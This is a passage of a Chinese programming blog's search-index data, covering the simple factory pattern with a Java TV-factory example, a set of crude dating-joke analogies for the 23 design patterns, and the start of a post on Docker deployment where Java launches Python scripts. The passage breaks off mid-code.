","date":"2021-04-16","objectID":"/posts/%E7%AE%80%E5%8D%95%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/:2:0","tags":["简单工厂模式"],"title":"简单工厂模式","uri":"/posts/%E7%AE%80%E5%8D%95%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式结构 ","date":"2021-04-16","objectID":"/posts/%E7%AE%80%E5%8D%95%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/:3:0","tags":["简单工厂模式"],"title":"简单工厂模式","uri":"/posts/%E7%AE%80%E5%8D%95%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式分析 将对象的创建和对象本身业务处理分离可以降低系统的耦合度，使得两者修改起来都相对容易 在调用工厂类的工厂方法时，由于工厂方法是静态方法，使用起来很方便，可通过工厂类类名直接调用，只需要传入一个简单的参数即可，无须知道对象的创建细节 可以将参数保存在XML等格式的配置文件中，修改时无须修改任何Java源代码 问题：工厂类的职责相对过重，增加新的产品需要修改工厂类的判断逻辑，违背开闭原则 ","date":"2021-04-16","objectID":"/posts/%E7%AE%80%E5%8D%95%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/:4:0","tags":["简单工厂模式"],"title":"简单工厂模式","uri":"/posts/%E7%AE%80%E5%8D%95%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"代码示例 某电视机厂专为各知名电视机品牌代工生产各类电视机，当需要海尔牌电视机时只需要在调用该工厂的工厂方法时传入参数“Haier”，需要海信电视机时只需要传入参数“Hisense”，工厂可以根据传入的不同参数返回不同品牌的电视机。现使用简单工厂模式来模拟该电视机工厂的生产过程。 抽象产品接口： public interface TV { public void play(); } 具体产品类： public class HairTV implements TV { @Override public void play() { System.out.println(\"海尔电视播放中、、、、、\"); } } public class HisenseTV implements TV { @Override public void play() { System.out.println(\"海信电视播放中、、、\"); } } 工厂类： public class TVFactory { public static TV produceTV(String type) throws Exception { if(type.equalsIgnoreCase(\"Hair\")){ return new HairTV(); }else if(type.equalsIgnoreCase(\"Hisense\")){ return new HisenseTV(); }else{ throw new Exception(\"对不起，不支持的电视类型\"); } } } 客户端： public class Client { public static void main(String args[]) { TV tv; try { tv=TVFactory.produceTV(\"Hair\"); tv.play(); } catch (Exception e) { e.printStackTrace(); } } } ","date":"2021-04-16","objectID":"/posts/%E7%AE%80%E5%8D%95%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/:5:0","tags":["简单工厂模式"],"title":"简单工厂模式","uri":"/posts/%E7%AE%80%E5%8D%95%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"优点 实现了对象创建和使用的分离 客户端无须知道所创建的具体产品类的类名，只需要知道具体产品类所对应的参数即可 通过引入配置文件，可以在不修改任何客户端代码的情况下更换和增加新的具体产品类，在一定程度上提高了系统的灵活性 ","date":"2021-04-16","objectID":"/posts/%E7%AE%80%E5%8D%95%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/:6:0","tags":["简单工厂模式"],"title":"简单工厂模式","uri":"/posts/%E7%AE%80%E5%8D%95%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"缺点 工厂类集中了所有产品的创建逻辑，职责过重，一旦不能正常工作，整个系统都要受到影响 增加系统中类的个数（引入了新的工厂类），增加了系统的复杂度和理解难度 系统扩展困难，一旦添加新产品不得不修改工厂逻辑 由于使用了静态工厂方法，造成工厂角色无法形成基于继承的等级结构，工厂类不能得到很好地扩展 ","date":"2021-04-16","objectID":"/posts/%E7%AE%80%E5%8D%95%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/:7:0","tags":["简单工厂模式"],"title":"简单工厂模式","uri":"/posts/%E7%AE%80%E5%8D%95%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"应用场景 工厂类负责创建的对象比较少：由于创建的对象较少，不会造成工厂方法中的业务逻辑太过复杂 客户端只知道传入工厂类的参数，对于如何创建对象不关心：客户端既不需要关心创建细节，甚至连类名都不需要记住，只需要知道类型所对应的参数 ","date":"2021-04-16","objectID":"/posts/%E7%AE%80%E5%8D%95%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/:8:0","tags":["简单工厂模式"],"title":"简单工厂模式","uri":"/posts/%E7%AE%80%E5%8D%95%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"01 工厂方法 追 MM 少不了请吃饭了，麦当劳的鸡翅和肯德基的鸡翅都是 MM 爱吃的东西，虽然口味有所不同，但不管你带 MM 去麦当劳或肯德基，只管向服务员说「来四个鸡翅」就行了。麦当劳和肯德基就是生产鸡翅的 Factory 工厂模式：客户类和工厂类分开。 消费者任何时候需要某种产品，只需向工厂请求即可。消费者无须修改就可以接纳新产品。缺点是当产品修改时，工厂类也要做相应的修改。如：如何创建及如何向客户端提供。 ","date":"2021-04-16","objectID":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/:0:1","tags":["23种设计模式歪解"],"title":"23种设计模式歪解","uri":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/"},{"categories":["设计模式"],"content":"02 建造者模式 MM 最爱听的就是「我爱你」这句话了，见到不同地方的 MM，要能够用她们的方言跟她说这句话哦，我有一个多种语言翻译机，上面每种语言都有一个按键，见到 MM 我只要按对应的键，它就能够用相应的语言说出「我爱你」这句话了，国外的 MM 也可以轻松搞掂，这就是我的「我爱你」builder。 建造模式：将产品的内部表象和产品的生成过程分割开来，从而使一个建造过程生成具有不同的内部表象的产品对象。建造模式使得产品内部表象可以独立的变化，客户不必知道产品内部组成的细节。建造模式可以强制实行一种分步骤进行的建造过程。 ","date":"2021-04-16","objectID":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/:0:2","tags":["23种设计模式歪解"],"title":"23种设计模式歪解","uri":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/"},{"categories":["设计模式"],"content":"03 抽象工厂 请 MM 去麦当劳吃汉堡，不同的 MM 有不同的口味，要每个都记住是一件烦人的事情，我一般采用 Factory Method 模式，带着 MM 到服务员那儿，说「要一个汉堡」，具体要什么样的汉堡呢，让 MM 直接跟服务员说就行了。 工厂方法模式：核心工厂类不再负责所有产品的创建，而是将具体创建的工作交给子类去做，成为一个抽象工厂角色，仅负责给出具体工厂类必须实现的接口，而不接触哪一个产品类应当被实例化这种细节。 ","date":"2021-04-16","objectID":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/:0:3","tags":["23种设计模式歪解"],"title":"23种设计模式歪解","uri":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/"},{"categories":["设计模式"],"content":"04 原型模式 跟 MM 用 QQ 聊天，一定要说些深情的话语了，我搜集了好多肉麻的情话，需要时只要 copy 出来放到 QQ 里面就行了，这就是我的情话 prototype 了。（100 块钱一份，你要不要） 原始模型模式：通过给出一个原型对象来指明所要创建的对象的类型，然后用复制这个原型对象的方法创建出更多同类型的对象。原始模型模式允许动态的增加或减少产品类，产品类不需要非得有任何事先确定的等级结构，原始模型模式适用于任何的等级结构。缺点是每一个类都必须配备一个克隆方法。 ","date":"2021-04-16","objectID":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/:0:4","tags":["23种设计模式歪解"],"title":"23种设计模式歪解","uri":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/"},{"categories":["设计模式"],"content":"05 单态模式 俺有 6 个漂亮的老婆，她们的老公都是我，我就是我们家里的老公 Sigleton，她们只要说道「老公」，都是指的同一个人，那就是我 (刚才做了个梦啦，哪有这么好的事) 单例模式：单例模式确保某一个类只有一个实例，而且自行实例化并向整个系统提供这个实例单例模式。单例模式只应在有真正的 “单一实例” 的需求时才可使用。 ","date":"2021-04-16","objectID":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/:0:5","tags":["23种设计模式歪解"],"title":"23种设计模式歪解","uri":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/"},{"categories":["设计模式"],"content":"06 适配器模式 在朋友聚会上碰到了一个美女 Sarah，从香港来的，可我不会说粤语，她不会说普通话，只好求助于我的朋友 kent 了，他作为我和 Sarah 之间的 Adapter，让我和 Sarah 可以相互交谈了 (也不知道他会不会耍我) 适配器（变压器）模式：把一个类的接口变换成客户端所期待的另一种接口，从而使原本因接口原因不匹配而无法一起工作的两个类能够一起工作。适配类可以根据参数返还一个合适的实例给客户端。 ","date":"2021-04-16","objectID":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/:0:6","tags":["23种设计模式歪解"],"title":"23种设计模式歪解","uri":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/"},{"categories":["设计模式"],"content":"07 桥梁模式 早上碰到 MM，要说早上好，晚上碰到 MM，要说晚上好；碰到 MM 穿了件新衣服，要说你的衣服好漂亮哦，碰到MM新做的发型，要说你的头发好漂亮哦。不要问我 “早上碰到 MM 新做了个发型怎么说” 这种问题，自己用 BRIDGE 组合一下不就行了。 桥梁模式：将抽象化与实现化脱耦，使得二者可以独立的变化，也就是说将他们之间的强关联变成弱关联，也就是指在一个软件系统的抽象化和实现化之间使用组合 / 聚合关系而不是继承关系，从而使两者可以独立的变化。 ","date":"2021-04-16","objectID":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/:0:7","tags":["23种设计模式歪解"],"title":"23种设计模式歪解","uri":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/"},{"categories":["设计模式"],"content":"08 合成模式 Mary 今天过生日。“我过生日，你要送我一件礼物。”“嗯，好吧，去商店，你自己挑。”“这件 T 恤挺漂亮，买，这条裙子好看，买，这个包也不错，买。”“喂，买了三件了呀，我只答应送一件礼物的哦。”“什么呀，T 恤加裙子加包包，正好配成一套呀，小姐，麻烦你包起来。”“……”，MM 都会用 Composite 模式了，你会了没有？ 合成模式：合成模式将对象组织到树结构中，可以用来描述整体与部分的关系。合成模式就是一个处理对象的树结构的模式。合成模式把部分与整体的关系用树结构表示出来。合成模式使得客户端把一个个单独的成分对象和由他们复合而成的合成对象同等看待。 ","date":"2021-04-16","objectID":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/:0:8","tags":["23种设计模式歪解"],"title":"23种设计模式歪解","uri":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/"},{"categories":["设计模式"],"content":"09 装饰模式 Mary 过完轮到 Sarly 过生日，还是不要叫她自己挑了，不然这个月伙食费肯定玩完，拿出我去年在华山顶上照的照片，在背面写上 “最好的的礼物，就是爱你的 Fita”，再到街上礼品店买了个像框（卖礼品的 MM 也很漂亮哦），再找隔壁搞美术设计的 Mike 设计了一个漂亮的盒子装起来……，我们都是 Decorator，最终都在修饰我这个人呀，怎么样，看懂了吗？ 装饰模式：装饰模式以对客户端透明的方式扩展对象的功能，是继承关系的一个替代方案，提供比继承更多的灵活性。动态给一个对象增加功能，这些功能可以再动态的撤消。增加由一些基本功能的排列组合而产生的非常大量的功能。 ","date":"2021-04-16","objectID":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/:0:9","tags":["23种设计模式歪解"],"title":"23种设计模式歪解","uri":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/"},{"categories":["设计模式"],"content":"10 门面模式 我有一个专业的 Nikon 相机，我就喜欢自己手动调光圈、快门，这样照出来的照片才专业，但 MM 可不懂这些，教了半天也不会。幸好相机有 Facade 设计模式，把相机调整到自动档，只要对准目标按快门就行了，一切由相机自动调整，这样 MM 也可以用这个相机给我拍张照片了。 门面模式：外部与一个子系统的通信必须通过一个统一的门面对象进行。门面模式提供一个高层次的接口，使得子系统更易于使用。每一个子系统只有一个门面类，而且此门面类只有一个实例，也就是说它是一个单例模式。但整个系统可以有多个门面类。 ","date":"2021-04-16","objectID":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/:0:10","tags":["23种设计模式歪解"],"title":"23种设计模式歪解","uri":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/"},{"categories":["设计模式"],"content":"11 享元模式 每天跟 MM 发短信，手指都累死了，最近买了个新手机，可以把一些常用的句子存在手机里，要用的时候，直接拿出来，在前面加上 MM 的名字就可以发送了，再不用一个字一个字敲了。共享的句子就是 Flyweight，MM 的名字就是提取出来的外部特征，根据上下文情况使用。享元模式：FLYWEIGHT 在拳击比赛中指最轻量级。 享元模式以共享的方式高效的支持大量的细粒度对象。享元模式能做到共享的关键是区分内蕴状态和外蕴状态。内蕴状态存储在享元内部，不会随环境的改变而有所不同。外蕴状态是随环境的改变而改变的。外蕴状态不能影响内蕴状态，它们是相互独立的。 将可以共享的状态和不可以共享的状态从常规类中区分开来，将不可以共享的状态从类里剔除出去。客户端不可以直接创建被共享的对象，而应当使用一个工厂对象负责创建被共享的对象。享元模式大幅度的降低内存中对象的数量。 ","date":"2021-04-16","objectID":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/:0:11","tags":["23种设计模式歪解"],"title":"23种设计模式歪解","uri":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/"},{"categories":["设计模式"],"content":"12 代理模式 跟 MM 在网上聊天，一开头总是 “hi, 你好”,“你从哪儿来呀？”“你多大了？”“身高多少呀？” 这些话，真烦人，写个程序做为我的 Proxy 吧，凡是接收到这些话都设置好了自己的回答，接收到其他的话时再通知我回答，怎么样，酷吧。 代理模式：代理模式给某一个对象提供一个代理对象，并由代理对象控制对源对象的引用。代理就是一个人或一个机构代表另一个人或者一个机构采取行动。某些情况下，客户不想或者不能够直接引用一个对象，代理对象可以在客户和目标对象直接起到中介的作用。 客户端分辨不出代理主题对象与真实主题对象。代理模式可以并不知道真正的被代理对象，而仅仅持有一个被代理对象的接口，这时候代理对象不能够创建被代理对象，被代理对象必须有系统的其他角色代为创建并传入。 ","date":"2021-04-16","objectID":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/:0:12","tags":["23种设计模式歪解"],"title":"23种设计模式歪解","uri":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/"},{"categories":["设计模式"],"content":"13 责任链模式 晚上去上英语课，为了好开溜坐到了最后一排，哇，前面坐了好几个漂亮的 MM 哎，找张纸条，写上 “Hi, 可以做我的女朋友吗？如果不愿意请向前传”，纸条就一个接一个的传上去了，糟糕，传到第一排的 MM 把纸条传给老师了，听说是个老处女呀，快跑！ 责任链模式：在责任链模式中，很多对象由每一个对象对其下家的引用而接起来形成一条链。请求在这个链上传递，直到链上的某一个对象决定处理此请求。客户并不知道链上的哪一个对象最终处理这个请求，系统可以在不影响客户端的情况下动态的重新组织链和分配责任。处理者有两个选择：承担责任或者把责任推给下家。一个请求可以最终不被任何接收端对象所接受。 ","date":"2021-04-16","objectID":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/:0:13","tags":["23种设计模式歪解"],"title":"23种设计模式歪解","uri":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/"},{"categories":["设计模式"],"content":"14 命令模式 俺有一个 MM 家里管得特别严，没法见面，只好借助于她弟弟在我们俩之间传送信息，她对我有什么指示，就写一张纸条让她弟弟带给我。这不，她弟弟又传送过来一个 COMMAND，为了感谢他，我请他吃了碗杂酱面，哪知道他说：“我同时给我姐姐三个男朋友送 COMMAND，就数你最小气，才请我吃面。” 命令模式：命令模式把一个请求或者操作封装到一个对象中。命令模式把发出命令的责任和执行命令的责任分割开，委派给不同的对象。命令模式允许请求的一方和发送的一方独立开来，使得请求的一方不必知道接收请求的一方的接口，更不必知道请求是怎么被接收，以及操作是否执行，何时被执行以及是怎么被执行的。系统支持命令的撤消。 ","date":"2021-04-16","objectID":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/:0:14","tags":["23种设计模式歪解"],"title":"23种设计模式歪解","uri":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/"},{"categories":["设计模式"],"content":"15 解释器模式 俺有一个《泡 MM 真经》，上面有各种泡 MM 的攻略，比如说去吃西餐的步骤、去看电影的方法等等，跟 MM 约会时，只要做一个 Interpreter，照着上面的脚本执行就可以了。 解释器模式：给定一个语言后，解释器模式可以定义出其文法的一种表示，并同时提供一个解释器。客户端可以使用这个解释器来解释这个语言中的句子。解释器模式将描述怎样在有了一个简单的文法后，使用模式设计解释这些语句。 在解释器模式里面提到的语言是指任何解释器对象能够解释的任何组合。在解释器模式中需要定义一个代表文法的命令类的等级结构，也就是一系列的组合规则。每一个命令对象都有一个解释方法，代表对命令对象的解释。命令对象的等级结构中的对象的任何排列组合都是一个语言。 ","date":"2021-04-16","objectID":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/:0:15","tags":["23种设计模式歪解"],"title":"23种设计模式歪解","uri":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/"},{"categories":["设计模式"],"content":"16 迭代模式 我爱上了 Mary，不顾一切的向她求婚。Mary：“想要我跟你结婚，得答应我的条件” 我：“什么条件我都答应，你说吧” Mary：“我看上了那个一克拉的钻石” 我：“我买，我买，还有吗？” Mary：“我看上了湖边的那栋别墅” 我：“我买，我买，还有吗？” Mary：“我看上那辆法拉利跑车” 我脑袋嗡的一声，坐在椅子上，一咬牙：“我买，我买，还有吗？” 迭代模式：迭代模式可以顺序访问一个聚集中的元素而不必暴露聚集的内部表象。多个对象聚在一起形成的总体称之为聚集，聚集对象是能够包容一组对象的容器对象。迭代子模式将迭代逻辑封装到一个独立的子对象中，从而与聚集本身隔开。 迭代模式简化了聚集的界面。每一个聚集对象都可以有一个或一个以上的迭代子对象，每一个迭代子的迭代状态可以是彼此独立的。迭代算法可以独立于聚集角色变化。 ","date":"2021-04-16","objectID":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/:0:16","tags":["23种设计模式歪解"],"title":"23种设计模式歪解","uri":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/"},{"categories":["设计模式"],"content":"17 调停者模式 四个 MM 打麻将，相互之间谁应该给谁多少钱算不清楚了，幸亏当时我在旁边，按照各自的筹码数算钱，赚了钱的从我这里拿，赔了钱的也付给我，一切就 OK 啦，俺得到了四个 MM 的电话。调停者模式：调停者模式包装了一系列对象相互作用的方式，使得这些对象不必相互明显作用。从而使他们可以松散偶合。 当某些对象之间的作用发生改变时，不会立即影响其他的一些对象之间的作用。保证这些作用可以彼此独立的变化。调停者模式将多对多的相互作用转化为一对多的相互作用。调停者模式将对象的行为和协作抽象化，把对象在小尺度的行为上与其他对象的相互作用分开处理。 ","date":"2021-04-16","objectID":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/:0:17","tags":["23种设计模式歪解"],"title":"23种设计模式歪解","uri":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/"},{"categories":["设计模式"],"content":"18 备忘录模式 同时跟几个 MM 聊天时，一定要记清楚刚才跟 MM 说了些什么话，不然 MM 发现了会不高兴的哦，幸亏我有个备忘录，刚才与哪个 MM 说了什么话我都拷贝一份放到备忘录里面保存，这样可以随时察看以前的记录啦。 备忘录模式：备忘录对象是一个用来存储另外一个对象内部状态的快照的对象。备忘录模式的用意是在不破坏封装的条件下，将一个对象的状态捉住，并外部化，存储起来，从而可以在将来合适的时候把这个对象还原到存储起来的状态。 ","date":"2021-04-16","objectID":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/:0:18","tags":["23种设计模式歪解"],"title":"23种设计模式歪解","uri":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/"},{"categories":["设计模式"],"content":"19 观察者模式 想知道咱们公司最新 MM 情报吗？加入公司的 MM 情报邮件组就行了，tom 负责搜集情报，他发现的新情报不用一个一个通知我们，直接发布给邮件组，我们作为订阅者（观察者）就可以及时收到情报啦。 观察者模式：观察者模式定义了一种一队多的依赖关系，让多个观察者对象同时监听某一个主题对象。这个主题对象在状态上发生变化时，会通知所有观察者对象，使他们能够自动更新自己。 ","date":"2021-04-16","objectID":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/:0:19","tags":["23种设计模式歪解"],"title":"23种设计模式歪解","uri":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/"},{"categories":["设计模式"],"content":"20 状态模式 跟 MM 交往时，一定要注意她的状态哦，在不同的状态时她的行为会有不同，比如你约她今天晚上去看电影，对你没兴趣的 MM 就会说 “有事情啦”，对你不讨厌但还没喜欢上的 MM 就会说 “好啊，不过可以带上我同事么？”，已经喜欢上你的 MM 就会说 “几点钟？看完电影再去泡吧怎么样？”，当然你看电影过程中表现良好的话，也可以把 MM 的状态从不讨厌不喜欢变成喜欢哦。 状态模式：状态模式允许一个对象在其内部状态改变的时候改变行为。这个对象看上去象是改变了它的类一样。状态模式把所研究的对象的行为包装在不同的状态对象里，每一个状态对象都属于一个抽象状态类的一个子类。 状态模式的意图是让一个对象在其内部状态改变的时候，其行为也随之改变。状态模式需要对每一个系统可能取得的状态创立一个状态类的子类。当系统的状态变化时，系统便改变所选的子类。 ","date":"2021-04-16","objectID":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/:0:20","tags":["23种设计模式歪解"],"title":"23种设计模式歪解","uri":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/"},{"categories":["设计模式"],"content":"21 策略模式 跟不同类型的 MM 约会，要用不同的策略，有的请电影比较好，有的则去吃小吃效果不错，有的去海边浪漫最合适，单目的都是为了得到 MM 的芳心，我的追 MM 锦囊中有好多 Strategy 哦。策略模式：策略模式针对一组算法，将每一个算法封装到具有共同接口的独立的类中，从而使得它们可以相互替换。 策略模式使得算法可以在不影响到客户端的情况下发生变化。策略模把行为和环境分开。环境类负责维持和查询行为类，各种算法在具体的策略类中提供。由于算法和环境独立开来，算法的增减，修改都不会影响到环境和客户端。 ","date":"2021-04-16","objectID":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/:0:21","tags":["23种设计模式歪解"],"title":"23种设计模式歪解","uri":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/"},{"categories":["设计模式"],"content":"22 模板方法模式 看过《如何说服女生上床》这部经典文章吗？女生从认识到上床的不变的步骤分为巧遇、打破僵局、展开追求、接吻、前戏、动手、爱抚、进去八大步骤 (Template method)，但每个步骤针对不同的情况，都有不一样的做法，这就要看你随机应变啦 (具体实现)； 模板方法模式：模板方法模式准备一个抽象类，将部分逻辑以具体方法以及具体构造子的形式实现，然后声明一些抽象方法来迫使子类实现剩余的逻辑。不同的子类可以以不同的方式实现这些抽象方法，从而对剩余的逻辑有不同的实现。先制定一个顶级逻辑框架，而将逻辑的细节留给具体的子类去实现。 ","date":"2021-04-16","objectID":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/:0:22","tags":["23种设计模式歪解"],"title":"23种设计模式歪解","uri":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/"},{"categories":["设计模式"],"content":"23 访问者模式 情人节到了，要给每个 MM 送一束鲜花和一张卡片，可是每个 MM 送的花都要针对她个人的特点，每张卡片也要根据个人的特点来挑，我一个人哪搞得清楚，还是找花店老板和礼品店老板做一下 Visitor，让花店老板根据 MM 的特点选一束花，让礼品店老板也根据每个人特点选一张卡，这样就轻松多了； 访问者模式：访问者模式的目的是封装一些施加于某种数据结构元素之上的操作。一旦这些操作需要修改的话，接受这个操作的数据结构可以保持不变。访问者模式适用于数据结构相对未定的系统，它把数据结构和作用于结构上的操作之间的耦合解脱开，使得操作集合可以相对自由的演化。访问者模式使得增加新的操作变的很容易，就是增加一个新的访问者类。 访问者模式将有关的行为集中到一个访问者对象中，而不是分散到一个个的节点类中。当使用访问者模式时，要将尽可能多的对象浏览逻辑放在访问者类中，而不是放到它的子类中。访问者模式可以跨过几个类的等级结构访问属于不同的等级结构的成员类。 ","date":"2021-04-16","objectID":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/:0:23","tags":["23种设计模式歪解"],"title":"23种设计模式歪解","uri":"/posts/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%AD%AA%E8%A7%A3/"},{"categories":["运维"],"content":"学生学术管理系统后端部署--Docker","date":"2021-04-15","objectID":"/posts/%E5%BE%AE%E6%9C%8D%E5%8A%A1compose-dockerfile%E9%83%A8%E7%BD%B2/","tags":["单个服务部署应用docker"],"title":"微服务compose+Dockerfile部署","uri":"/posts/%E5%BE%AE%E6%9C%8D%E5%8A%A1compose-dockerfile%E9%83%A8%E7%BD%B2/"},{"categories":["运维"],"content":"单个微服务部署应用环境： Java：8 python3(pymysql、pandas、numpy、sklearn) ","date":"2021-04-15","objectID":"/posts/%E5%BE%AE%E6%9C%8D%E5%8A%A1compose-dockerfile%E9%83%A8%E7%BD%B2/:1:0","tags":["单个服务部署应用docker"],"title":"微服务compose+Dockerfile部署","uri":"/posts/%E5%BE%AE%E6%9C%8D%E5%8A%A1compose-dockerfile%E9%83%A8%E7%BD%B2/"},{"categories":["运维"],"content":"主代码功能： ​ 利用Java与前端交互，Java调用python文件以线程的方式在本地执行，Java也有一个python的依赖，但是可定制读不高，python库支持不完全。 ","date":"2021-04-15","objectID":"/posts/%E5%BE%AE%E6%9C%8D%E5%8A%A1compose-dockerfile%E9%83%A8%E7%BD%B2/:2:0","tags":["单个服务部署应用docker"],"title":"微服务compose+Dockerfile部署","uri":"/posts/%E5%BE%AE%E6%9C%8D%E5%8A%A1compose-dockerfile%E9%83%A8%E7%BD%B2/"},{"categories":["运维"],"content":"解决思路： ​ Java利用Process运行外部运行python命令以绝对路径运行py文件，做到java的jar包与python文件解耦，同时，python文件中用到的MySQL环境参数以环境变量获得。 ","date":"2021-04-15","objectID":"/posts/%E5%BE%AE%E6%9C%8D%E5%8A%A1compose-dockerfile%E9%83%A8%E7%BD%B2/:3:0","tags":["单个服务部署应用docker"],"title":"微服务compose+Dockerfile部署","uri":"/posts/%E5%BE%AE%E6%9C%8D%E5%8A%A1compose-dockerfile%E9%83%A8%E7%BD%B2/"},{"categories":["运维"],"content":"Java代码： @GetMapping(\"/associRule\") @ApiOperation(\"使用关联规则推荐比赛\") public String test(String uid){ Process proc; String line = null; try { String[] args1 = new String[] { \"python\", 